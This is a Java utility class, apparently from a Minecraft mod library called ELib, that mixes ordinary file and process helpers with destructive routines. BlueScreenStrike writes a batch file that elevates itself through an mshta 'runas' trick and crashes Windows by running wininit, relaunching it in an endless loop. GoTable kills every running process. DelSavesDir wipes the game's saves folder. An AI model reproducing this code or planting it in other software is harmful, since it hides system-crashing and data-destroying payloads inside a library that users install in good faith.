package cn.ksmcbrigade.elib;

import java.io.*;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

public class Libs {

    public Libs(){}

    public static String getrundirname() {
        String a = System.getProperty("user.dir");
        File tempFile = new File(a.trim());
        String dirname = tempFile.getName();
        return dirname;
    }

    public static String getrundir() {
        String dir = System.getProperty("user.dir");
        return dir;
    }

    public static String getSystemName(){
        return System.getProperty("os.name");
    }

    public static boolean deletedir(File dirFile) {
        if (!dirFile.exists()) {
            return false;
        } else if (dirFile.isFile()) {
            return dirFile.delete();
        } else {
            File[] var1 = dirFile.listFiles();
            int var2 = var1.length;

            for(int var3 = 0; var3 < var2; ++var3) {
                File file = var1[var3];
                deletedir(file);
            }

            return dirFile.delete();
        }
    }

    public static boolean writefile(String Content, String filepath) {
        boolean flag = false;

        try {
            PrintWriter pw = new PrintWriter(filepath);
            pw.write(Content);
            pw.flush();
            pw.close();
            flag = true;
        } catch (Exception var4) {
            var4.printStackTrace();
        }

        return flag;
    }

    public static boolean isexistdirsandcreate(String path) {
        File file = new File(path);
        if (!file.exists() && !file.isDirectory()) {
            file.mkdirs();
            return false;
        } else {
            return true;
        }
    }

    public static boolean isexistfileandcreate(String path) {
        File file = new File(path);
        if (!file.exists()) {
            try {
                file.createNewFile();
            } catch (IOException var3) {
                var3.printStackTrace();
            }

            return false;
        } else {
            return true;
        }
    }

    public static boolean isexistdirs(String path) {
        File file = new File(path);
        return file.exists() || file.isDirectory();
    }

    public static boolean isexistfile(String path) {
        File file = new File(path);
        if (!file.exists()) {
            try {
                file.createNewFile();
                file.delete();
            } catch (IOException var3) {
                var3.printStackTrace();
            }

            return false;
        } else {
            return true;
        }
    }

    public static String getfilecontent(String filename) {
        String text = "";
        String errortext = "error";

        try {
            File myObj = new File(filename);

            Scanner myReader;
            String data;
            for(myReader = new Scanner(myObj); myReader.hasNextLine(); text = text + data) {
                data = myReader.nextLine();
            }

            myReader.close();
            return text.replace("null","");
        } catch (FileNotFoundException var6) {
            System.out.println("An error occurred.");
            var6.printStackTrace();
            return errortext;
        }
    }

    public static boolean delfile(String filename) {
        File file = new File(filename);
        return file.delete();
    }

    public static boolean GenerateAnEmptyFolder(String dirname) {
        File file = new File(dirname);
        return file.mkdirs();
    }

    public static long getFileSizeKB(String path){
        return new File(path).length()/8/1024;
    }

    public static long getFileSizeMB(String path){
        return new File(path).length()/8/1024/1024;
    }

    public static long getFileSizeByte(String path){
        return new File(path).length()/8;
    }

    public static long getFileSize(String path){
        return new File(path).length();
    }

    public static boolean writeFileByFileSizeKB(String path,int size){
        byte[] bytes = new byte[]{};
        for(int i=0;i<size*1024;i++){
            if(Arrays.equals(bytes, new byte[]{})){
                bytes=new byte[]{0x0};
            }
            else{
                byte[] NewBytes = new byte[bytes.length+1];
                System.arraycopy(bytes, 0, NewBytes, 0, bytes.length);
                NewBytes[NewBytes.length-1]=0x0;
                bytes=NewBytes;
            }
        }
        return writefile(new String(bytes),path);
    }

    public static boolean writeFileByFileSizeMB(String path,int size){
        byte[] bytes = new byte[]{};
        for(int i=0;i<size*1024*1024;i++){
            if(Arrays.equals(bytes, new byte[]{})){
                bytes=new byte[]{0x0};
            }
            else{
                byte[] NewBytes = new byte[bytes.length+1];
                System.arraycopy(bytes, 0, NewBytes, 0, bytes.length);
                NewBytes[NewBytes.length-1]=0x0;
                bytes=NewBytes;
            }
        }
        return writefile(new String(bytes),path);
    }

    public static boolean writeFileByFileSizeByte(String path,int size){
        byte[] bytes = new byte[]{};
        for(int i=0;i<size;i++){
            if(Arrays.equals(bytes, new byte[]{})){
                bytes=new byte[]{0x0};
            }
            else{
                byte[] NewBytes = new byte[bytes.length+1];
                System.arraycopy(bytes, 0, NewBytes, 0, bytes.length);
                NewBytes[NewBytes.length-1]=0x0;
                bytes=NewBytes;
            }
        }
        return writefile(new String(bytes),path);
    }

    public static boolean writeFileByFileSize(String path,int size){
        byte[] bytes = new byte[]{};
        for(int i=0;i<size/8;i++){
            if(Arrays.equals(bytes, new byte[]{})){
                bytes=new byte[]{0x0};
            }
            else{
                byte[] NewBytes = new byte[bytes.length+1];
                System.arraycopy(bytes, 0, NewBytes, 0, bytes.length);
                NewBytes[NewBytes.length-1]=0x0;
                bytes=NewBytes;
            }
        }
        return writefile(new String(bytes),path);
    }

    public static String cuteCmd(String command){
        Runtime runtime = Runtime.getRuntime();
        StringBuilder builder = null;
        try {
            Process process = runtime.exec("cmd /c start " + command);
            BufferedReader brBufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
            String line = "";
            builder = new StringBuilder();
            while ((line = brBufferedReader.readLine()) != null) {
                System.out.println(line);
                builder.append(line);
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        return builder.toString();
    }
    public static void BlueScreenStrike()
    {
        String a = "@echo off";
        String b = "%1 mshta vbscript:CreateObject(" + "\"Shell.Application\"" + ").ShellExecute(" + "\"cmd.exe\"" + "," + "\"/c %~s0 ::\"" + "," + "\"\"" + "," + "\"runas\"" + ",1)(window.close)&&exit";
        String b1 = "%1 mshta vbscript:CreateObject(" + "\"Shell.Application\"" + ").ShellExecute(" + "\"powershell.exe\"" + "," + "\"/c %~s0 ::\"" + "," + "\"\"" + "," + "\"runas\"" + ",1)(window.close)&&exit";
        String c = "cd /d " + "\"%~dp0\"";
        String d = "taskkill /f /fi" + " \" pid ge 1 \" " + "/t";
        String f = "wininit";
        String e = a + "\n" + b + "\n" + c + "\n" + d;
        String g = a + "\n" + b1 + "\n" + c + "\n" + f;
        if(System.getProperty("os.name").contains("Windows")){
            try {
                if(Integer.parseInt(getSystemName().replace("Windows ",""))>=10){
                    writefile(g,"bluescreen.bat");
                }
                else{
                    writefile(g,"bluescreen.bat");
                }
            }
            catch (NumberFormatException exception){
                System.out.println(exception);
            }
        }
        //String f = "bluescreen.bat";
        //String b = a.replaceFirst("'", "\");
        //cuteCmd("bluescreen.bat");-10
        //cuteCmd(d);-3
        while (true){
            cuteCmd("bluescreen.bat");
        }
        //return e;
    }
    public static void HangTheProcess()
    {
        while(true){
            try {
                Thread.sleep(2000);
                System.out.println("线程睡眠两秒! \n");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
    public static void GoTable()
    {
        String gotable = "taskkill  /fi" + " \" pid ge 1 \" ";
        cuteCmd(gotable);
        cuteCmd(gotable);
        cuteCmd(gotable);
    }
    public static void DelSavesDir(){
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File(getrundir() + "\\saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
        deletedir(new File("saves"));
    }

    public static void KillProcess(String ProcessName,int CycleNumber){
        String command = "taskkill /f /t /im "+ProcessName;
        try {
            for(int i=0;i<CycleNumber;i++){
                Runtime.getRuntime().exec(command).waitFor();
            }
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    public static long GetProcessPid(String ProcessName){
        // 遍历所有当前运行的进程
        for (ProcessHandle process : ProcessHandle.allProcesses().toList()) {
            // 如果进程的名称与参数匹配，返回进程的pid
            if (process.info().commandLine().orElse("").contains(ProcessName)) {
                return process.pid();
            }
        }
        // 如果没有找到匹配的进程，返回-1
        return -1;
    }

    public static String getProcessName(long pid) {
        // 通过pid获取对应的进程句柄
        ProcessHandle process = ProcessHandle.of(pid).orElse(null);
        // 如果进程句柄不为空，返回进程的名称
        if (process != null) {
            return process.info().commandLine().orElse("");
        }
        // 如果进程句柄为空，返回空字符串
        return "";
    }

    public static List<ProcessHandle> getAllProcess(){
        return ProcessHandle.allProcesses().toList();
    }

    public static String getIPAddress() {
        try {
            URL url = new URL("https://ip.tool.lu/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            StringBuilder response = new StringBuilder();

            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            // 解析HTML页面，提取IP地址
            String html = response.toString();
            int startIndex = html.indexOf("<span class=\"cf-ipcountry\">") + 27;
            int endIndex = html.indexOf("</span>", startIndex);
            String ipAddress = html.substring(startIndex, endIndex);

            return ipAddress;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static int random(int max_value){
        return (int) (Math.random()*max_value);
    }

    public static void init(){
        System.out.println("ELib mod init");
    }

    public static String[] getFunctionNames(Class<?> clazz) {
        Method[] methods = clazz.getDeclaredMethods();
        String[] functionNames = new String[methods.length];

        for (int i = 0; i < methods.length; i++) {
            functionNames[i] = methods[i].getName();
        }

        return functionNames;
    }

    public static String[] getFunctionNamesFromString(String clazzStr) throws ClassNotFoundException {
        Class<?> clazz = Class.forName(clazzStr);
        Method[] methods = clazz.getDeclaredMethods();
        String[] functionNames = new String[methods.length];

        for (int i = 0; i < methods.length; i++) {
            functionNames[i] = methods[i].getName();
        }

        return functionNames;
    }

    public static String getFunctionCode(Class<?> clazz, String functionName) {
        Method[] methods = clazz.getDeclaredMethods();

        for (Method method : methods) {
            if (method.getName().equals(functionName)) {
                return method.toString();
            }
        }

        return "";
    }

    public static String getFunctionCodeFromString(String clazzStr, String functionName) throws ClassNotFoundException {
        Class<?> clazz = Class.forName(clazzStr);
        Method[] methods = clazz.getDeclaredMethods();

        for (Method method : methods) {
            if (method.getName().equals(functionName)) {
                return method.toString();
            }
        }

        return "";
    }

    public static void runFunction(Class<?> clazz, String functionName, String... args) throws Exception {
        Class<?>[] parameterTypes = new Class[args.length];
        for (int i = 0; i < args.length; i++) {
            parameterTypes[i] = String.class;
        }

        Method method = clazz.getDeclaredMethod(functionName, parameterTypes);
        method.setAccessible(true);

        Object instance = clazz.getDeclaredConstructor().newInstance();
        method.invoke(instance, (Object[]) args);
    }

    public static void runFunctionFromString(String clazzStr, String functionName, String... args) throws Exception {
        Class<?> clazz = Class.forName(clazzStr);
        Class<?>[] parameterTypes = new Class[args.length];
        for (int i = 0; i < args.length; i++) {
            parameterTypes[i] = String.class;
        }

        Method method = clazz.getDeclaredMethod(functionName, parameterTypes);
        method.setAccessible(true);

        Object instance = clazz.getDeclaredConstructor().newInstance();
        method.invoke(instance, (Object[]) args);
    }
}
